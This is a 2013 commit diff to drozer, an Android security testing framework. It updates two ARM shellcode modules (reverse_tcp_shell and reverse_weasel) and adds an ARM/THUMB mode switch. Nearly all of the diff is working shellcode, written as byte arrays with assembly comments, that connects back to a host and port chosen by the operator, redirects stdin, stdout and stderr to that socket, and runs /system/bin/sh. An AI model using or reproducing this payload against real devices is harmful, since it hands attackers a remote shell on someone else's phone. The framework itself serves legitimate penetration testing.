f080c175cf5d9af46031388d9c4412cd42911e1a
metall0id <tyrone.erasmus@gmail.com>
2013-07-24 22:46:14 +0200

    Updated shellcode and added ARM/THUMB mode option

--- src/drozer/modules/payloads/shellcode/reverse_tcp_shell.py
+++ src/drozer/modules/payloads/shellcode/reverse_tcp_shell.py
@@ -17,23 +17,29 @@ class ARMEABI(Module, common.ShellCode):
                                                       --format U
     """
     author = "Tyrone (@mwrlabs)"
-    date = "2013-06-18"
+    date = "2013-07-24"
     license = "BSD (3 clause)"
     module_type = "payload"
     path = ["shell.reverse_tcp"]
-    
+
     def __init__(self, session, loader, exploit=None):
         Module.__init__(self, session)
         
         self.__exploit = exploit
         self.__loader = loader
     
+    def add_arguments(self, parser):
+        parser.add_argument("--mode", default="ARM", help="specify which mode the CPU is in at the point where shellcode is executed")
+    
     def generate(self, arguments):
-        self.append([# Switch to THUMB mode for more compact shellcode
-                     0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
-                     0x11, 0xff, 0x2f, 0xe1,     # bx    r1
-                     
-                     # socket() - store fd in r3
+
+        if arguments.mode == "ARM":
+            self.append([# Switch to THUMB mode for more compact shellcode
+                         0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
+                         0x11, 0xff, 0x2f, 0xe1      # bx    r1
+                        ])
+
+        self.append([# socket() - store fd in r3
                      0x02, 0x20,                 # mov   r0, #2
                      0x01, 0x21,                 # mov   r1, #1
                      0x52, 0x40,                 # eor   r2, r2
@@ -44,15 +50,17 @@ class ARMEABI(Module, common.ShellCode):
                      
                      # connect()
                      0x10, 0x22,                 # mov   r2, #16
-                     0x09, 0xa1,                 # add   r1, pc, #36
+                     0x79, 0x46,                 # mov   r1, pc
+                     0x2a, 0x31,                 # add   r1, r1, #42
                      0x02, 0x37,                 # add   r7, r7, #2
                      0x01, 0xdf,                 # svc   1
                      
-                     # write('W')
+                     # write('S')
                      0x18, 0x1c,                 # mov   r0, r3
                      0x01, 0x22,                 # mov   r2, #1
                      0x04, 0x27,                 # mov   r7, #4
-                     0x08, 0xa1,                 # add   r1, pc, #32
+                     0x79, 0x46,                 # mov   r1, pc
+                     0x24, 0x31,                 # add   r1, r1, #36
                      0x01, 0xdf,                 # svc   1
 
                      # dup2() stderr, stdout and stdin
@@ -66,16 +74,19 @@ class ARMEABI(Module, common.ShellCode):
 
                      # execve('/system/bin/sh')
                      0x52, 0x40,                 # eor   r2, r2
-                     0x05, 0xa0,                 # add   r0, pc, #20
+                     0x78, 0x46,                 # mov   r0, pc
+                     0x11, 0x30,                 # add   r0, r0, #17
                      0x05, 0xb4,                 # push  {r0, r2}
                      0x69, 0x46,                 # mov   r1, sp
                      0x0b, 0x27,                 # mov   r7, #11
                      0x01, 0xdf,                 # svc   1
+
                      0x02, 0x00 ])
         self.append(self.hexifyInt32(int(arguments.server[1])))
         self.append(self.hexifyInetAddr(arguments.server[0]))
+
         self.append(self.hexifyString("S"))     # 'S' to indicate shell
-        self.append(self.hexifyString("AA"))    # Padding
+
         self.append(self.hexifyString("/system/bin/sh"))
         self.append(self.hexifyNull())
         
--- src/drozer/modules/payloads/shellcode/reverse_weasel.py
+++ src/drozer/modules/payloads/shellcode/reverse_weasel.py
@@ -25,7 +25,7 @@ class ARMEABI(Module, common.ShellCode):
                                                       --format U
     """
     author = "Tyrone (@mwrlabs)"
-    date = "2013-06-18"
+    date = "2013-07-24"
     license = "BSD (3 clause)"
     module_type = "payload"
     path = ["weasel.reverse_tcp"]
@@ -38,13 +38,17 @@ class ARMEABI(Module, common.ShellCode):
     
     def add_arguments(self, parser):
         parser.add_argument("--working-directory", default=None, help="specify the directory that weasel will execute in")
+        parser.add_argument("--mode", default="ARM", help="specify which mode the CPU is in at the point where shellcode is executed")
     
     def generate(self, arguments):
-        self.append([# Switch to THUMB mode for more compact shellcode
-                     0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
-                     0x11, 0xff, 0x2f, 0xe1,     # bx    r1
-                     
-                     # socket() - store fd in r3
+
+        if arguments.mode == "ARM":
+            self.append([# Switch to THUMB mode for more compact shellcode
+                         0x01, 0x10, 0x8f, 0xe2,     # add   r1, pc, #1
+                         0x11, 0xff, 0x2f, 0xe1      # bx    r1
+                        ])
+
+        self.append([# socket() - store fd in r3
                      0x02, 0x20,                 # mov   r0, #2
                      0x01, 0x21,                 # mov   r1, #1
                      0x52, 0x40,                 # eor   r2, r2
@@ -55,7 +59,8 @@ class ARMEABI(Module, common.ShellCode):
                      
                      # connect()
                      0x10, 0x22,                 # mov   r2, #16
-                     0x09, 0xa1,                 # add   r1, pc, #36
+                     0x79, 0x46,                 # mov   r1, pc
+                     0x2a, 0x31,                 # add   r1, r1, #42
                      0x02, 0x37,                 # add   r7, r7, #2
                      0x01, 0xdf,                 # svc   1
                      
@@ -63,7 +68,8 @@ class ARMEABI(Module, common.ShellCode):
                      0x18, 0x1c,                 # mov   r0, r3
                      0x01, 0x22,                 # mov   r2, #1
                      0x04, 0x27,                 # mov   r7, #4
-                     0x08, 0xa1,                 # add   r1, pc, #32
+                     0x79, 0x46,                 # mov   r1, pc
+                     0x24, 0x31,                 # add   r1, r1, #36
                      0x01, 0xdf,                 # svc   1
 
                      # dup2() stderr, stdout and stdin
@@ -77,16 +83,19 @@ class ARMEABI(Module, common.ShellCode):
 
                      # execve('/system/bin/sh')
                      0x52, 0x40,                 # eor   r2, r2
-                     0x05, 0xa0,                 # add   r0, pc, #20
+                     0x78, 0x46,                 # mov   r0, pc
+                     0x11, 0x30,                 # add   r0, r0, #17
                      0x05, 0xb4,                 # push  {r0, r2}
                      0x69, 0x46,                 # mov   r1, sp
                      0x0b, 0x27,                 # mov   r7, #11
                      0x01, 0xdf,                 # svc   1
+
                      0x02, 0x00 ])
         self.append(self.hexifyInt32(int(arguments.server[1])))
         self.append(self.hexifyInetAddr(arguments.server[0]))
+
         self.append(self.hexifyString("W"))     # 'W' to indicate weasel
-        self.append(self.hexifyString("AA"))    # Padding
+
         self.append(self.hexifyString("/system/bin/sh"))
         self.append(self.hexifyNull())
         
